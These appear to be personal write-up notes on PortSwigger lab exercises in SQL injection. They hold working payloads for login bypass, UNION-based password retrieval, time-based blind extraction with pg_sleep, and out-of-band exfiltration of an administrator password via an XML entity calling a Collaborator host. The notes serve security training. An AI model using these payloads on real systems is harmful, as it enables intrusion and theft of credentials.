# Important Notes
* If it's oracle, you need to make sure that you select from dual, i.e.
```' UNION SELECT NULL FROM DUAL--```
* On 
"MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment."

# Apprentice
## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
Background: display all products of any category
Payload: https://ac171fc21e837c23c0e34afc00d300f9.web-security-academy.net/filter?category=Accessories%27+or+%271%27=%271
tldr: ' or '1'='1

## Lab: SQL injection vulnerability allowing login bypass
Background: Login as administrator
Payload: username set to on the login page: administrator'-- 

## Lab: SQL injection UNION attack, determining the number of columns returned by the query
Background: it's in category again and we just need to count the columns with a union select
First run a query, comment the rest of the line to confirm it works (else you will get an internal server error)
This works: GET /filter?category=1'+-- 

**There's a few options:**

https://ac911fe71e9eb3afc0b54717000f0026.web-security-academy.net/filter?category=1'order+by+3-- 

Increment the order by starting by 1, the table has 3 columns, so we use:

```1' order by 3 ```

https://ac911fe71e9eb3afc0b54717000f0026.web-security-academy.net/filter?category=1'+union+all+select+'1','2','3'--

```1' union all select '1','2', '3'--```

Note, for some dumb reason, it doesn't allow you to complete the lab unless you use "null" instead of strings even though the other query works.

## Lab: SQL injection UNION attack, determining the number of columns returned by the query
Background: make the db return "FukClL" I just did a normal union select 1,2,3 then got an error so changed the one at a time to strings with a single quote and 2 was printed on the page. 
Payload: /filter?category='+union+select+1,'FukClL',3--




# SQLi
* First find out which comment we can use (if required) i.e "--" ," --", "#" or "/*"
* now count the rows using order by <number> increase until you get an error (its the last working number i.e a 200)
* if you're using the write number in columns in union select, try converting them to string i.e. union select 1,2 becomes union select '1','2'
* to return 2 sets of data in one column, we can just use concat etc
* https://portswigger.net/web-security/sql-injection/cheat-sheet

https://portswigger.net/web-security/all-labs
----------------------------------------------------------------------
SQL injection UNION attack, retrieving data from other tables
https://0a8300050380cfc4c06ec6b600a9000b.web-security-academy.net/filter?category=1'+union+select+password,'2'+from+users+where+username='administrator'--


SQL injection UNION attack, retrieving multiple values in a single column
you can use concat, or just return the password and specify the username 
¯\_(ツ)_/¯

time based injections
======================
postgres supports stacked queries so to confirm its vulnerable we can just 
1'%3b+select+pg_sleep(10)--; note 3b = ; because its in a cookie and we don't want to start a new one
test postgres syntax: https://extendsclass.com/postgresql-online.html
i.e. select '1'; select pg_sleep(1);

oracle: http://sqlfiddle.com/#!4/42960/37674


trackingId=1'%3b+select+case+when+(1=1)+then+pg_sleep(10)+else+pg_sleep(0)+end--;

select 1;select case when (select substring(select firstname from scientist),1,1))>1 then pg_sleep(2) else pg_sleep(0) end

Cookie: TrackingId=1'%3b+select case when (select substring((select password from users where username='administrator'),1,1)='j') then pg_sleep(5) else pg_sleep(0) end--;session=ev8n6dWOmBq5RziIrbx85StJywqScQw

first numbeer in subrstring is position, we just increase this.

To check this in intruder, create a custom resource pool (on intruder -> resource pool) with a max size of 1

run the intruder test then look at columns -> response recieved we're looking for a time around 5000

first char is j

we repeat this again with Cookie: TrackingId=1'%3b+select case when (select substring((select password from users where username='administrator'),2,1)='§a§') then pg_sleep(5) else pg_sleep(0) end-

we should of really used length(password)>1 to find the length

second char is 7

until the last response doesnt have any wait at all so we know the password is this:
j7ibmrwcaol5mdyeel9u


# Blind SQL injection with out-of-band interaction
aka try all the payloads fronm the cheat sheet

Cookie: TrackingId='+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//jcz46clfqhtvsfr3a0qnuh966xcn0c.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;


union select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % cggnv SYSTEM "http://'||(SELECT replace(replace(username, " ","-"),"$","-") FROM users||'.wcci020m40br46gak7v9ssa46vcl0a.o'||'astify.com/">%cggnv;]>'),'/l') from dual--


wcci020m40br46gak7v9ssa46vcl0a.oastify.com

to fingerprint databases, to check for oracle, simpel check is try and select something from dual and see if it works or not

## Blind SQL injection with out-of-band data exfiltration
it is important to note that in order to include the password it must be just alpha (or we need to use replace or base64), we have to break the sql to put a new statement in our payload so after http:// we have a single quote then use ||| to pipe the result of another sql command and then finally '.<collob-url>.com and then the normal url:

TrackingId='+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(select password from users where username='administrator')||'.jcz46clfqhtvsfr3a0qnuh966xcn0c.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;

## SQL injection with filter bypass via XML encoding
probably related to this https://twitter.com/masteringburp/status/1366774208668315650g


# todo make docker/test box for oracle/microsoft/postgres and mysql to test payloads in the exam


https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
